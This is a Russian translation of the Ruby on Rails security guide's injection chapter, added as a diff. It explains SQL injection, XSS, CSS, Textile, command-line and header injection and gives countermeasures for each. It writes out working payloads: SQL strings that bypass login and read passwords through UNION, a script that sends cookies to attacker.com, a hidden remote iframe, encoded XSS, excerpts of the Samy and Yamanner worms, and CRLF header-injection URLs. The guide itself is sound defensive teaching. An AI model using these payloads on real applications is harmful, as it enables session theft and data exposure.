@@ -1,0 +1,266 @@
+h1. Инъекции
+
+<p>&#8212; <em>Инъекции это класс атак, внедряющий злонамеренный код или параметры в веб приложение для запуска их вне контекста безопасности. Известными примерами инъекций являются межсайтовый скриптинг (<span class="caps">XSS</span>) и <span class="caps">SQL</span> инъекции.</em></p>
+<p>Инъекции очень запутанные, поскольку тот же код или параметр может быть злонамеренным в одном контексте, но абсолютно безвредным в другом. Контекстом может быть сценарий, запрос или язык программирования, оболочка или метод Ruby/Rails. Следующие разделы раскроют все важные контексты, где могут произойти атаки в форме инъекций. Первый раздел, однако, раскроет архитектурное решение в связи с инъекцией.</p>
+
+<h4 id="whitelists-versus-blacklists">1. Белые списки против черных списков</h4>
+<p>&#8212; <em>При экранировании, защите или верификации чего-либо, белые списки приоритетнее черных списков.</em></p>
+<p>Черный список может быть перечнем плохих адресов e-mail, непубличных действий или плохих тегов <span class="caps">HTML</span>. Этому противопоставляется белый список хороших адресов e-mail, публичных действий, хороших тегов <span class="caps">HTML</span> и так далее. Хотя иногда не возможно создать белый список (в фильтре спама, например), <em class="highlight">предпочтительнее использовать подходы белого списка</em>:</p>
+<ul>
+	<li>Используйте before_filter :only =&gt; [&#8230;] вместо :except =&gt; [&#8230;]. Тогда вы не забудете отключить только что добавленные экшны.</li>
+	<li>Используйте attr_accessible вместо attr_protected. Подробнее смотрите <a href="./ruby-on-rails-security-guide/mass-assignment">раздел по массовому назначению</a></li>
+	<li>Разрешите &lt;strong&gt; вместо удаления &lt;script&gt; против кроссайтового скриптинга (<span class="caps">XSS</span>). Подробнее об этом ниже.</li>
+	<li>Не пытайтесь править пользовательские данные с помощью черных списков:
+	<ul>
+		<li>Это позволит сработать атаке: &#8220;&lt;sc&lt;script&gt;ript&gt;&#8221;.gsub(&#8220;&lt;script&gt;&#8221;, &quot;&quot;)</li>
+		<li>Но отвергнет неправильный ввод</li>
+	</ul></li>
+</ul>
+<p>Белые списки также хороший подход против человеческого фактора в забывании чего-либо в черном списке.</p>
+
+<h4 id="sql-injection">2. <span class="caps">SQL</span> инъекции</h4>
+<p>&#8212; <em>Благодаря умным методам, это вряд ли является проблемой в большинстве приложений на Rails. Однако, это очень разрушительная и обычная атака на веб приложения, поэтому важно понять проблему.</em></p>
+
+<h5 id="introduction">2.1 Введение</h5>
+<p>Цель атаки в форме <span class="caps">SQL</span> инъекции - сделать запросы к базе данных, манипулируя с параметрами приложения. Популярная цель атак в форме <span class="caps">SQL</span> инъекций - обойти авторизацию. Другой целью является осуществление манипуляции с данными или чтение определенных данных. Вот пример, как не следует использовать пользовательские данные в запросе:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+Project.where("name = '#{params[:name]}'")
+</pre></div>
+<p>Это может быть экшн поиска и пользователь может ввести имя проекта, который он хочет найти. Если злонамеренный пользователь введет &#8217; OR 1=1&#8217;, результирующим <span class="caps">SQL</span> запросом будет:</p>
+<div class="code_container"><pre class="brush: sql; gutter: false; toolbar: false">
+SELECT * FROM projects WHERE name = '' OR 1 --'
+</pre></div>
+<p>Два тире начинают комментарий, игнорирующий все после него. Таким образом, запрос вернет все записи из таблицы projects, включая те, которые недоступны пользователю. Так случилось, поскольку условие истинно для всех записей.</p>
+
+<h5 id="bypassing-authorization">2.2 Обход авторизации</h5>
+<p>Обычно веб приложения включают контроль доступа. Пользователь вводит свои полномочия входа, веб приложение пытается найти соответствующую запись в таблице пользователей. Приложение предоставляет доступ, когда находит запись. Однако, злоумышленник возможно сможет обойти эту проверку с помощью <span class="caps">SQL</span> инъекции. Следующее показывает типичный запрос к базе данных в Rails для поиска первой записи в таблице users, которая соответствует параметрам полномочий входа, предоставленных пользователем.</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+User.find(:first, &quot;login = '#{params[:name]}' AND password = '#{params[:password]}'&quot;)
+</pre></div>
+<p>Если злоумышленник введет &#8217; OR &#8216;1&#8217;=&#8216;1 как имя и &#8217; OR &#8217;2&#8217;&gt;&#8217;1 как пароль, результирующий запрос <span class="caps">SQL</span> будет:</p>
+<div class="code_container"><pre class="brush: sql; gutter: false; toolbar: false">
+SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&amp;gt;'1' LIMIT 1
+</pre></div>
+<p>Это просто найдет первую запись в базе данных и предоставит доступ этому пользователю.</p>
+
+<h5 id="unauthorized-reading">2.3. Неавторизованное чтение</h5>
+<p>Выражение <span class="caps">UNION</span> соединяет два запроса <span class="caps">SQL</span> и возвращает данные одним набором. Злоумышленник может использовать это, чтобы прочитать произвольную информацию из базы данных. Давайте рассмотрим вышеописанный пример:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+Project.where("name = '#{params[:name]}'")
+</pre></div>
+<p>Теперь позволим внедрить другой запрос, использующий выражение <span class="caps">UNION</span>:</p>
+<div class="code_container"><pre class="brush: sql; gutter: false; toolbar: false">
+') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
+</pre></div>
+<p>Это приведет к следующему запросу <span class="caps">SQL</span>:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+SELECT * FROM projects WHERE (name = '') UNION
+  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
+</sql></div>
+<p>Результатом будет не список проектов (поскольку нет проектов с пустым именем), а список имен пользователя и их пароли. Поэтому надеемся, что вы шифруете пароли в базе данных! Единственной проблемой для злоумышленника может быть то, что число столбцов должно быть равное в обоих запросах. Вот почему второй запрос включает список единичек (1), который всегда будет иметь значение 1, чтобы количество столбцов соответствовало первому запросу.</p>
+<p>Также второй запрос переименовывает некоторые столбцы выражением AS, чтобы веб приложение отображало значения из таблицы user. Убедитесь, что обновили свой Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">как минимум до 2.1.1</a>.</p>
+
+<h5 id="countermeasures">2.4. Контрмеры</h5>
+<p>В Ruby on Rails есть встроенный фильтр для специальных символов <span class="caps">SQL</span>, которые экранируются &#8217; , &quot; , символ <span class="caps">NULL</span> и разрыв строки. <em class="highlight">Использование <tt>Model.find(id)</tt> или <tt>Model.find_by_some thing(something)</tt> автоматически применяет эту контрмеру</em>. Но в фрагментах <span class="caps">SQL</span>, особенно <em class="highlight">в фрагментах условий (<tt>where("...")</tt>), методах <tt>connection.execute()</tt> или <tt>Model.find_by_sql()</tt>, это должно быть применено вручную</em>.</p>
+<p>Вместо передачи строки в опцию conditions, можете передать массив, чтобы экранировать испорченные строки, подобно этому:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+</pre></div>
+<p>Как видите, первая часть массива это фрагмент <span class="caps">SQL</span> с знаками вопроса. Экранируемые версии переменных во второй части массива заменяют знаки вопроса. Или можете передать хэш с тем же результатом:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+Model.where(:login => entered_user_name, :password => entered_password).first
+</pre></div>
+<p>Форма массива или хэша доступна только в экземплярах модели. В других местах используйте <tt>sanitize_sql()</tt>. <em class="highlight">Введите в привычку думать о последствиях безопасности, когда используете внешние строки в <span class="caps">SQL</span></em>.</p>
+
+<h4 id="cross-site-scripting-xss">3. Межсайтовый скриптинг (<span class="caps">XSS</span>)</h4>
+<p>&#8212; <em>Наиболее распространенная и одна из наиболее разрушительных уязвимостей в веб приложениях это <span class="caps">XSS</span>. Данная вредоносная атака внедряет на стороне клиента исполняемый код. Rails предоставляет методы для защиты от этих атак.</em></p>
+
+<h5 id="entry-points">3.1. Точки входа</h5>
+<p>Точка входа это уязвимый <span class="caps">URL</span> и его параметры, с которых злоумышленник может начать атаку.</p>
+<p>Наиболее распространенными точками входа являются публикации сообщений, комментарии пользователей и гостевые книги, но заголовки проектов, имена документов и страницы результата поиска также бывают уязвимы &#8211; почти везде, где пользователь может ввести данные. Но ввод не обязательно может придти из полей ввода на веб сайтах, это может быть любой параметр <span class="caps">URL</span> – очевидный, скрытый или внутренний. Помните, что пользователь может перехватить любой трафик. Приложения, такие как <a href="http://livehttpheaders.mozdev.org/">плагин Live <span class="caps">HTTP</span> Headers Firefox</a>, или клиентские прокси могут легко изменить запросы.</p>
+<p>Атаки <span class="caps">XSS</span> работают подобным образом: злоумышленник встраивает некоторый код, веб приложение сохраняет его и отображает на странице, после чего представляет его жертве. Большинство примеров <span class="caps">XSS</span> просто отображают сообщение, но реальные возможности гораздо мощнее. <span class="caps">XSS</span> может своровать куки, похитить сессию, перенаправить жертву на фальшивый вебсайт, отобразить рекламу, полезную злоумышленнику, изменить элементы на веб странице, чтобы получить конфиденциальную информацию или установить вредоносное программное обеспечение, используя дыры в веб браузере.</p>
+<p>Во второй половине 2007 года выявлено 88 уязвимостей в браузерах Mozilla, 22 в Safari, 18 в IE и 12 в Opera. <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> также задокументировал 239 уязвимостей плагинов для браузеров в последние шесть месяцев 2007 года. <a href="http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx">Mpack</a> очень активный и регулярно обновляемый фреймворк злоумышленников, который использует эти уязвимости. Для преступных хакеров очень привлекательно использовать уязвимость к <span class="caps">SQL</span>-инъекциям в фреймворке веб приложения и вставлять вредоносный код в каждый текстовый столбец таблицы. В апреле 2008 года более 510,000 сайтов были взломаны подобным образом, в том числе Британского правительства, ООН и многих других высокопоставленных организаций.</p>
+<p>Относительно новыми и необычными точками входа является баннерная реклама. В начале 2008 года злонамеренный код появился в рекламных баннерах на популярных сайтах, таких как MySpace и Excite, сообщает <a href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend Micro</a>.</p>
+
+<h5 id="htmljavascript-injection">3.2. <span class="caps">HTML</span>/JavaScript инъекции</h5>
+<p>Наиболее распространенным языком для <span class="caps">XSS</span> является, конечно, наиболее популярный клиентский скриптовый язык JavaScript, часто в сочетании с <span class="caps">HTML</span>. <em class="highlight">Экранирование пользовательского ввода необходима</em>.</p>
+<p>Вот самый простой тест для проверки на <span class="caps">XSS</span>:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;script&gt;alert('Hello');&lt;/script&gt;
+</pre></div>
+<p>Этот код JavaScript просто отображает сообщение. Следующие примеры делают примерно то же самое,но в очень необычных местах:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;img src=javascript:alert('Hello')&gt;
+&lt;table background=&quot;javascript:alert('Hello')&quot;&gt;
+</pre></div>
+
+<h6 id="cookie-theft">3.2.1. Похищение куки</h6>
+<p>Пока эти примеры не делали никакого вреда, поэтому давайте посмотрим, как злоумышленник может похитить куки пользователя (и, таким образом, похитить пользовательскую сессию). В JavaScript можно использовать свойство document.cookie для чтения и записи куки документа. JavaScript обеспечивает политику ограничения домена, которая означает, что скрипт с одного домена не может получить доступ к куки другого домена. Свойство document.cookie содержит куки создавшего веб сервера. Однако это свойство можно прочитать и записать, если внедрите код непосредственно в документ <span class="caps">HTML</span> (как это происходит в <span class="caps">XSS</span>). Введите это где-нибудь в своем веб приложении, чтобы увидеть собственные куки на результирующей странице:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
+</pre></div>
+<p>Для злоумышленника, разумеется, бесполезно, что жертва видит свои куки. Следующий пример пытается загрузить изображение с <span class="caps">URL</span> http://www.attacker.com/ плюс куки. Конечно, этот <span class="caps">URL</span> не существует, поэтому браузер ничего не отобразит. Но злоумышленник сможет просмотреть логи доступа к своему веб серверу, чтобы увидеть куки жертв.</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;script&gt;document.write('&lt;img src=&quot;http://www.attacker.com/' + document.cookie + '&quot;&gt;');&lt;/script&gt;
+</pre></div>
+<p>Лог файлы  на www.attacker.com будут подобны следующему:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
+</pre></div>
+<p>Можно смягчить эти атаки (очевидным способом) добавив к куки флаг <a href="http://dev.rubyonrails.org/ticket/8895">httpOnly</a>, таким образом, document.cookie не сможет быть прочитан JavaScript. Http only куки могут использоваться начиная с IE v6.SP1, Firefox v2.0.0.5 и Opera 9.5. Safari все еще рассматривает, но игнорирует эту опцию. Но другие, более старые браузеры (такие как WebTV и IE 5.5 on Mac) могут фактически отказаться загружать страницу. Однако, будьте осторожны, что куки <a href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">все еще видны при использовании Ajax</a>.</p>
+
+<h6 id="defacement">3.2.2. Искажение</h6>
+<p>Исказив веб страницу, злоумышленник сможет сделать многое, например, предоставить ложную информацию или завлечь жертву на сайт злоумышленника, чтобы украсть куки, регистрационные данные или другую деликатную информацию. Наиболее популярным способом является включение кода с внешних источников с помощью iframe:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;iframe name=”StatPage” src=&quot;http://58.xx.xxx.xxx&quot; width=5 height=5 style=”display:none”&gt;&lt;/iframe&gt;
+</pre></div>
+<p>Это загрузит произвольный <span class="caps">HTML</span> и/или JavaScript с внешнего источника и внедрит его, как часть сайта. Этот iframe взят из настоящей атаки на правительственные итальянские сайты с использованием <a href="http://isc.sans.org/diary.html?storyid=3015">Mpack attack framework</a>. Mpack пытается установить злонамеренное программное обеспечение через дыры безопасности в веб браузере – очень успешно, 50% атак успешны.</p>
+<p>Более специализированные атаки могут накрывать целые веб сайты или отображать форму входа, которая выглядит как такая же на оригинальном сайте, но передает имя пользователя и пароль на сайт злоумышленников. Или могут использовать <span class="caps">CSS</span> и/или JavaScript, чтобы спрятать настоящую ссылку в веб приложении, и отобразить на ее месте другую, которая перенаправит на фальшивый веб сайт.</p>
+<p>Атаки в форме искажающих инъекций являются такими, что основная загрузка не хранится, а предоставляется жертве позже, но включена в <span class="caps">URL</span>. Особенно в формах поиска не получается экранировать строку поиска. Следующая ссылка представляет страницу, озаглавленную &#8220;George Bush appointed a 9 year old boy to be the chairperson&#8230;&#8221;:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
+  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
+</pre></div>
+
+<h6 id="countermeasures">3.2.3. Контрмеры</h6>
+<p><em class="highlight">Очень важно отфильтровывать злонамеренный ввод, но также важно экранировать вывод в веб приложении</em>.</p>
+<p>Особенно для <span class="caps">XSS</span>, важно делать <em class="highlight">фильтрацию ввода с помощью белого списка, а не черного</em>. Фильтрация белым списком устанавливает допустимые значения, остальные значения недопустимы. Черные списки всегда не законченные.</p>
+<p>Предположим, черный список удаляет “script” из пользовательского ввода. Теперь злоумышленник встраивает “&lt;scrscriptipt&gt;”, и после фильтра остается “&lt;script&gt;”. Ранние версии Rails использовали подход черного списка для методов strip_tags(), strip_links() and sanitize(). Поэтому такой сорт инъекций был возможен:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+strip_tags(&quot;some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;&quot;)
+</pre></div>
+<p>Это возвратит &#8220;some&lt;script&gt;alert(&#8216;hello&#8217;)&lt;/script&gt;&#8221;, что позволит осуществится атаке. Вот почему мы выбираем подход белого списка, используя метод Rails 2 sanitize():</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, :tags =&gt; tags, :attributes =&gt; %w(href title))
+</pre></div>
+<p>Это допустит только заданные теги и сделает все хорошо, даже против всех ухищрений и злонамеренных тегов.</p>
+<p>В качестве второго шага, <em class="highlight">хорошо экранировать весь вывод в приложении</em>, особенно при переотображении пользовательского ввода, который не был отфильтрован при вводе (как в примере выше). <em class="highlight">Используйте метод <tt>escapeHTML()</tt> (или его псевдоним <tt>h()</tt>)</em>, чтобы заменить введенные символы <span class="caps">HTML</span> &amp;, &quot;, &lt;, &gt; их неинтерпретируемыми представителями в <span class="caps">HTML</span> (<tt>&amp;amp;</tt>, <tt>&amp;quot;</tt>, <tt>&amp;lt</tt>; и <tt>&amp;gt;</tt>). Однако, может случиться так, что программист забудет это сделать, поэтому <em class="highlight">рекомендуется использовать плагин <a href="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/">SafeErb</a></em>. SafeErb напоминает экранировать строки из внешних источников.</p>
+
+<h6 id="obfuscation-and-encoding-injection">3.2.4. Обфусцированная и закодированная инъекция</h6>
+<p>Сетевой трафик главным образом основан на ограниченном Западном алфавите, поэтому новые кодировки символов, такие как Unicode, возникли для передачи символов на других языках. Но это также угроза для веб приложений, так как злонамеренный код может быть спрятан в различных кодировках, так что веб браузер сможет его выполнить, а веб приложение нет. Вот направление атаки в кодировке <span class="caps">UTF</span>-8:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;
+  &amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&gt;
+</pre></div>
+<p>Этот пример вызывает окно сообщения. Хотя это распознается фильтром sanitize(). Хорошим инструментом для обфускации и кодирования строк (знайте своего врага!) является <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">Hackvertor</a>. Метод Rails sanitize() работает хорошо, отражая закодированные атаки.</p>
+
+<h5 id="examples-from-the-underground">3.3. Примеры из прошлого</h5>
+<p><em>Чтобы понять сегодняшние атаки на веб приложения, лучше взглянуть на некоторые реальные направления атаки.</em></p>
+<p>Нижеследующее это переведенная выдержка из <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! почтовый <a href="http://groovin.net/stuff/yammer.txt">червь</a>. Он появился 11 июня 2006 года и был первым червем с почтовым интерфейсом:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
+  target=&quot;&quot;onload=&quot;var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+</pre></div>
+<p>Черви использовали дыру в фильтре <span class="caps">HTML</span>/JavaScript Yahoo, который обычно фильтровал все атрибуты target и onload из тегов (потому что там мог быть JavaScript). Однако фильтр применялся только раз, поэтому атрибут onload с кодом червя оставался. Это хороший пример, почему фильтры черного списка никогда не полные, и почему трудно позволить <span class="caps">HTML</span>/JavaScript в веб приложении.</p>
+<p>Другой прототипный веб-почтовый червь Nduja, кроссдоменный червь для четырех итальянских веб-почтовых сервисов. Более детально описано в <a href="http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/">статье Rosario Valotta</a>. Оба почтовых червя имели целью собрать почтовые адреса, на чем преступный хакер мог сделать деньги.</p>
+<p>В декабре 2006 года 34,000 имени фактических пользователей и их пароли были похищены во время <a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">фишинговой атаки на MySpace</a>. Идеей атаки было создание профиля, названного “login_home_index_html”, поэтому <span class="caps">URL</span> выглядел очень правдоподобно. Специально созданный <span class="caps">HTML</span> и <span class="caps">CSS</span> использовался, чтобы скрыть настоящий контент MySpace и вместо этого отразить собственную форму входа.</p>
+<p>Червь MySpace Samy будет обсужден в разделе <span class="caps">CSS</span> инъекций.</p>
+
+<h4 id="css-injection">4. <span class="caps">CSS</span> инъекция</h4>
+<p>&#8212; <em><span class="caps">CSS</span> инъекция - это фактически JavaScript инъекция, поскольку некоторые браузеры (IE, некоторые версии Safari и другие) разрешают JavaScript в <span class="caps">CSS</span>. Подумайте дважды о допустимости пользовательского <span class="caps">CSS</span> в Вашем веб приложении.</em></p>
+<p><span class="caps">CSS</span> инъекция лучше всего объясняется известным червем, <a href="http://namb.la/popular/tech.html">MySpace Samy worm</a>. Этот червь автоматически рассылал предложение дружбы с Samy (злоумышленником), просто посетив его профиль. В течение нескольких часов он сделал свыше 1 миллиона запросов дружбы, но создал слишком много трафика на MySpace и сайт ушел в оффлайн. Ниже следует техническое объяснение червя.</p>
+<p>MySpace блокирует много тегов, однако он позволял <span class="caps">CSS</span>. Поэтому автор червя поместил JavaScript в <span class="caps">CSS</span> следующим образом:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;div style=&quot;background:url('javascript:alert(1)')&quot;&gt;
+</pre></div>
+<p>Таким образом загрузка происходила через атрибут стиля. Но в загрузке не допустимы кавычки, так как одинарные и двойные кавычки уже были использованы. Но в JavaScript имеется удобная функция eval(), которая выполняет любую строку как код.</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;div id=&quot;mycode&quot; expr=&quot;alert('hah!')&quot; style=&quot;background:url('javascript:eval(document.all.mycode.expr)')&quot;&gt;
+</pre></div>
+<p>Функция eval() это кошмар для фильтров ввода на основе черного списка, так как она позволяет атрибуту стиля спрятать слово “innerHTML”:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+alert(eval('document.body.inne' + 'rHTML'));
+</pre></div>
+<p>Следующей проблемой было то, что MySpace фильтровал слово “javascript”, поэтому автор использовал “java&lt;<span class="caps">НОВАЯ СТРОКА</span>&gt;script&quot; чтобы обойти это:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+&lt;div id=&quot;mycode&quot; expr=&quot;alert('hah!')&quot; style=&quot;background:url('java↵ script:eval(document.all.mycode.expr)')&quot;&gt;
+</pre></div>
+<p>Следующей проблемой для автора червя были токены безопасности <span class="caps">CSRF</span>. Без них он не смог бы послать запросы дружбы через <span class="caps">POST</span>. Он обошел это, посылая <span class="caps">GET</span> на страницу перед добавлением пользователя и парся результат на токен <span class="caps">CSRF</span>.</p>
+<p>В итоге он получил 4 KB червя, которого внедрил в свою страницу профиля.</p>
+<p>Свойство <a href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> <span class="caps">CSS</span> предоставляет другой способ внедрить JavaScript в <span class="caps">CSS</span> в основанных на Gecko браузерах (Firefox, к примеру).</p>
+
+<h5 id="countermeasures">4.1. Контрмеры</h5>
+<p>Этот пример снова показывает, что фильтр на основе черного списка никогда не полон. Однако, так как пользовательский <span class="caps">CSS</span> в веб приложениях достаточно редкая особенность, фильтры <span class="caps">CSS</span> на основе белого списка автору не известны. <em class="highlight">Если хотите разрешить пользовательские цвета или картинки, разрешите выбрать их и создайте <span class="caps">CSS</span> в веб приложении</em>. Используйте метод Rails <tt>sanitize()</tt> как модель для фильтра <span class="caps">CSS</span> на основе белого списка, если это действительно нужно.</p>
+
+<h4 id="textile-injection">5. Текстильная инъекция</h4>
+<p>&#8212; <em>Если хотите предоставить форматирование текста иное, чем <span class="caps">HTML</span> (для безопасности), используйте разметочный язык, конвертируемый в <span class="caps">HTML</span> на сервере. <a href="http://redcloth.org/">RedCloth</a> это такой язык для Ruby, но без мер предосторожности он также уязвим к <span class="caps">XSS</span>.</em></p>
+<p>Например, RedCloth переводит <tt>_test_</tt> в &lt;em&gt;test&lt;em&gt;, который делает текст курсивом. Однако, до версии 3.0.4 была уязвимость к <span class="caps">XSS</span>. Возьмите <a href="http://www.redcloth.org">новую версию 4</a>, в которой устранены серьезные баги. Однако даже эта версия имела (на момент написания статьи) <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">несколько багов безопасности</a>, поэтому контрмеры только применялись. Вот пример для версии 3.0.4:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
+# =&gt; &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;
+</pre></div>
+<p>Используем опцию :filter_html, чтобы устранить <span class="caps">HTML</span>, который не был создан процессором Textile.</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
+# =&gt; &quot;alert(1)&quot;
+</pre></div>
+<p>Однако, это не отфильтрует весь <span class="caps">HTML</span>, некоторые теги останутся (преднамеренно), например &lt;a&gt;:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+RedCloth.new(&quot;&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;&quot;, [:filter_html]).to_html
+# =&gt; &quot;&lt;p&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hello&lt;/a&gt;&lt;/p&gt;&quot;
+</pre></div>
+
+<h5 id="countermeasures">5.1. Контрмеры</h5>
+<p>Рекомендуется <em class="highlight">использовать RedCloth в сочетании с фильтром ввода на основе белого списка</em>, как описано в разделе о контрмерах против <span class="caps">XSS</span>.</p>
+
+<h4 id="ajax-injection">6. Ajax инъекции</h4>
+<p>&#8212; <em>Те же меры безопасности должны быть приняты для экшнов Ajax, что и для “нормальных”. Однако, есть как минимум одно исключение: Вывод экранируется уже в контроллере, если экшн не рендерит вьюху.</em></p>
+<p>Если используете <a href="http://dev.rubyonrails.org/browser/plugins/in_place_editing">плагин in_place_editor</a> или экшны, возвращающие строку, а не рендерите вьюху, <em class="highlight">нужно экранировать возвращаемое значение в экшне</em>. В ином случае, если возвращаемое значение содержит строку с <span class="caps">XSS</span>, злонамеренный код выполнится по возващению в браузер. Экранируйте каждое введенное значение с помощью метода h().</p>
+
+<h4 id="rjs-injection">7. <span class="caps">RJS</span> инъекция</h4>
+<p>&#8212; <em>Также не забывайте экранировать в шаблонах JavaScript (<span class="caps">RJS</span>).</em></p>
+<p><span class="caps">RJS</span> <span class="caps">API</span> создает блоки кода JavaScript, основанного на коде Ruby, это позволяет управлять вьюхой или частью вьюхи со стороны сервера. <em class="highlight">Если позволяете пользовательский ввод в шаблонах <span class="caps">RJS</span>, экранируйте это, используя <tt>escape_javascript()</tt> в функциях JavaScript, и в частях <span class="caps">HTML</span> используйте <tt>h()</tt></em>. В ином случае, злоумышленник сможет запустить произвольный JavaScript.</p>
+<h4 id="command-line-injection">8. Инъекции командной строки</h4>
+<p>&#8212; <em>Используйте предоставленные пользователем параметры командной строки с предосторожностью</em></p>
+<p>Если Ваше приложение запускает команды в лежащей в основе операционной системе, имеется несколько методов в Ruby: exec(command), syscall(command), system(command) и \<tt>command</tt>. Вы должны быть особенно осторожны с этими функциями, если пользователь может вводить целые команды или часть их. Это так, так как во многих оболочках можно запускать другую команду в конце первой, разделяя их точкой с запятой (;) или вертикальной чертой (|).</p>
+<p>Контрмерой является <em class="highlight">использование метода <tt>system(command, parameters)</tt>, который передает параметры командной строки безопасно</em>.</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+system(&quot;/bin/echo&quot;,&quot;hello; rm *&quot;)
+# prints &quot;hello; rm *&quot; and does not delete files
+</pre></div>
+
+<h4 id="header-injection">9. Инъекция заголовка</h4>
+<p>&#8212; <em>Заголовки <span class="caps">HTTP</span> динамически создаются и при определенных обстоятельствах могут быть изменены пользовательски вводом. Это может привести к ложному перенаправлению, <span class="caps">XSS</span> или <span class="caps">HTTP</span> response splitting.</em></p>
+<p>Заголовки запроса <span class="caps">HTTP</span> имеют поля Referer, User-Agent (клиентское ПО) и Cookie, среди прочих. Заголовки отклика, к примеру, имеют код статуса, Cookie и Location (цель перенаправления на <span class="caps">URL</span>). Все они предоставлены пользователем и могут быть манипулированы с большими или меньшими усилиями. <em class="highlight">Не забывайте экранировать эти поля заголовка тоже.</em> Например, когды Вы отображаете user agent в администраторской зоне.</p>
+<p>Кроме того, <em class="highlight">важно знать, что делаете, когда создаете заголовки отклика, частично основанные на пользовательском вводе.</em> Например, Вы хотите перенаправить пользователя на определенную страницу. Для этого Вы представили поле “referer“ в форме для перенаправления на заданный адрес:</p>
+<div class="code_container"><pre class="brush: ruby; gutter: false; toolbar: false">
+redirect_to params[:referer]
+</pre></div>
+<p>Что произойдет, если Rails поместит строку в заголовок Location и пошлет статус 302 (redirect) браузеру. Первое, что сделает злонамеренный пользователь, это:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
+</pre></div>
+<p>И благодаря багу в (Ruby and) Rails до версии 2.1.2 (исключая ее), хакер может внедрить произвольные поля заголовка; например, так:</p>
+<div class="code_container"><pre class="brush: plain; gutter: false; toolbar: false">
+http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
+http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
+</pre></div>
